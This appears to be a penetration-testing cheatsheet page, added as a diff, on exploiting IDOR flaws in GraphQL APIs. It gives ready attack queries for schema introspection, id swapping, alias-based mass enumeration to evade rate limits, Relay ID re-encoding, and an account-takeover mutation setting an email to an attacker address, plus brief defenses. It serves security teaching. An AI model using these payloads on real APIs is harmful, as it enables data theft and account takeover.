@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>IDOR in GraphQL · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › IDOR</nav><h1>IDOR in GraphQL</h1><p class="cx-lede">GraphQL concentrates object access behind one endpoint - introspection maps the objects, direct id arguments and Relay global IDs expose them, and alias/batch queries enumerate them en masse in a single request.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1213</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT DataExfil, AuthBypass, AccountTakeover</span><span class="cx-tag">OWASP A01</span></div><article class="cx-body"><p>GraphQL doesn't change what IDOR <em>is</em> - it's still a missing object-level authorization check - but it changes how you find and exploit it. Objects are fetched by argument (<code>user(id: 42)</code>) through a single endpoint, the schema is often self-describing via introspection, and aliases/batching let you pull hundreds of objects in <strong>one</strong> request. If the resolver authorizes the <em>query</em> but not the <em>object</em>, every one of those is an IDOR.</p>
+<h2 id="tldr">TL;DR</h2>
+<figure class="cx-code"><figcaption>graphql</figcaption><pre><code class="language-graphql"># 1. Map the schema (if introspection is on)
+query { __schema { queryType { fields { name } } types { name fields { name } } } }
+
+# 2. Direct object access - swap the id
+query { user(id: 42) { id email role } }
+
+# 3. Mass-enumerate in ONE request via aliases (bypasses per-request rate limits)
+query { u1: user(id:1){email} u2: user(id:2){email} u3: user(id:3){email} }
+
+# 4. Relay global node IDs are usually base64(&quot;Type:pk&quot;)
+#    &quot;VXNlcjo0Mg==&quot; -&gt; &quot;User:42&quot;; decode, change the pk, re-encode
+query { node(id: &quot;VXNlcjo0Mw==&quot;) { ... on User { email } } }</code></pre></figure>
+<p>Success indicator: a field you shouldn't see (another user's email, a private record) comes back - or a mutation on someone else's object succeeds.</p>
+<h2 id="why-graphql-is-idor-prone">Why GraphQL is IDOR-prone</h2>
+<ul>
+<li><strong>One endpoint, many objects.</strong> <code>/graphql</code> resolves any object the schema exposes; developers often put authentication on the endpoint and forget per-object authorization in the resolvers.</li>
+<li><strong>Introspection hands you the map.</strong> When enabled (common outside production, and left on in production more than it should be), <code>__schema</code> lists every type, field, query, and mutation - no guessing which objects exist.</li>
+<li><strong>Aliases and batching remove the rate limit.</strong> A single document can request the same field hundreds of times under different aliases, so the per-request throttles that would slow REST <a href="../mass-enumeration/index.html">mass enumeration</a> don't apply.</li>
+<li><strong>Mutations are object calls too.</strong> <code>updateUser(id: 42, role: ADMIN)</code> is the GraphQL form of the <a href="../insecure-apis/index.html">insecure-API</a> function-call IDOR.</li>
+</ul>
+<h2 id="step-1-map-the-schema">Step 1 - Map the schema</h2>
+<div class="cx-steps">
+<ol>
+<li>Try introspection. If it's on, pull the full type/field/query/mutation list; a tool like GraphQL Voyager or InQL (Burp) renders it.</li>
+<li>If introspection is disabled, fall back to field suggestions ("did you mean …" errors leak names), known-schema wordlists, or the client-side JS, which often contains the queries.</li>
+<li>Note every query/mutation that takes an <code>id</code>/<code>uuid</code>/object-reference argument - those are your IDOR candidates.</li>
+</ol>
+</div>
+<h2 id="step-2-test-direct-object-access">Step 2 - Test direct object access</h2>
+<p>Request an object that isn't yours and see whether the resolver checks ownership:</p>
+<figure class="cx-code"><figcaption>graphql</figcaption><pre><code class="language-graphql">query { user(id: 42) { id email role ssn } }
+mutation { updateUser(id: 42, input: { email: &quot;attacker@evil.com&quot; }) { id } }</code></pre></figure>
+<p>Swap <code>id</code> to another user's. If data comes back (or the mutation succeeds) without you being that user or an admin, it's IDOR - same bug as REST, different transport.</p>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Mutations are where GraphQL IDOR turns critical - an <code>updateUser</code>/<code>setRole</code>/<code>resetPassword</code> mutation that trusts its <code>id</code> argument is account takeover or privilege escalation. As with the <a href="../chaining/index.html">chaining</a> finish, a resolver that lets you set a privileged field (<code>role</code>, <code>isAdmin</code>) on your <em>own</em> object is also escalation, so test field-by-field, not just object-by-object.</p>
+</div>
+<h2 id="step-3-decode-relay-global-ids">Step 3 - Decode Relay global IDs</h2>
+<p>Relay-style APIs expose a <code>node(id: ID!)</code> field and opaque global IDs. These are almost always base64 of <code>Type:primarykey</code>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo -n &#x27;VXNlcjo0Mg==&#x27; | base64 -d      # -&gt; User:42
+echo -n &#x27;User:43&#x27; | base64              # -&gt; VXNlcjo0Mw==   (the next user)</code></pre></figure>
+<p>Decode one you legitimately hold, change the primary key, re-encode, and pass it to <code>node(id: …)</code>. The opacity is not access control - it's the GraphQL equivalent of the encoded-reference reversal on the <a href="../mass-enumeration/index.html">mass-enumeration</a> page.</p>
+<h2 id="step-4-mass-enumerate-with-aliases-and-batching">Step 4 - Mass-enumerate with aliases (and batching)</h2>
+<p>Aliases let one query ask for the same resolver many times, so you dump a whole table in a single request - no per-request rate limit to fight:</p>
+<figure class="cx-code"><figcaption>graphql</figcaption><pre><code class="language-graphql">query {
+  u1: user(id: 1) { email role }
+  u2: user(id: 2) { email role }
+  u3: user(id: 3) { email role }
+  # ...generate up to the server&#x27;s document/complexity limit
+}</code></pre></figure>
+<p>Generate the document programmatically (a short script emitting <code>uN: user(id:N){...}</code> lines). If the endpoint also accepts a <strong>JSON array of operations</strong> (query batching), that's a second batching channel. Watch for depth/complexity/alias caps - those are the server-side limits you may hit.</p>
+<h2 id="defense">Defense</h2>
+<p>Same core fix as all IDOR - server-side object-level authorization in every resolver - plus GraphQL-specific hardening (disable introspection in production, cap query depth/complexity and alias/batch counts, rate-limit by operation cost). See <a href="../defense/index.html">IDOR defense</a>.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Map</td>
+<td><code>__schema</code> introspection; InQL/Voyager; field-suggestion leaks if off</td>
+</tr>
+<tr>
+<td>Direct</td>
+<td><code>user(id:N)</code> / <code>updateUser(id:N,...)</code> - swap the id</td>
+</tr>
+<tr>
+<td>Global IDs</td>
+<td>base64-decode <code>node</code> IDs (<code>Type:pk</code>), change pk, re-encode</td>
+</tr>
+<tr>
+<td>Mass</td>
+<td>alias the resolver <code>uN: user(id:N)</code> in one document; or JSON batch</td>
+</tr>
+<tr>
+<td>Escalate</td>
+<td>mutations on others' objects; privileged fields on your own</td>
+</tr>
+</tbody>
+</table>
+<h2 id="next-move">Next move</h2>
+<ul>
+<li><strong>Introspection returns the schema</strong> → enumerate id-taking queries/mutations; start <a href="#step-2---test-direct-object-access">direct object access</a></li>
+<li><strong><code>node(id:)</code> present</strong> → decode the global IDs and enumerate by primary key</li>
+<li><strong>Need bulk</strong> → alias-batch in one request to dodge rate limits (<a href="../mass-enumeration/index.html">mass enumeration</a> for the extraction/parsing side)</li>
+<li><strong>Mutation accepts another user's id</strong> → account takeover / privilege escalation; see <a href="../chaining/index.html">chaining</a></li>
+<li><strong>Hardening this</strong> → <a href="../defense/index.html">IDOR defense</a></li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../insecure-apis/index.html">Previous: Insecure APIs</a><a class="cx-next" href="../chaining/index.html">Next: Chaining</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
